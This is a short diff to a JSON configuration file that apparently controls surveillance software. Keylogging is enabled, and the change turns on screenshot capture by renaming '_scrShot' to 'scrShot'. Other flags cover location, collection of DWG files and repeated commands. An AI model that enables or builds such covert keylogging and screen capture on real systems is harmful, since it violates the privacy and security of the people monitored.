@@ -15,7 +15,7 @@
   "_certainFileTypeInRootFolder":"dwg",
   "timeRepeatMinutes": 1,
   "reloadconfigFile": true,
-  "_scrShot": true,
+  "scrShot": true,
   "keyLog": true,
   "_pcCurrentLoc": true,
   "repeatCmdCommands": true,
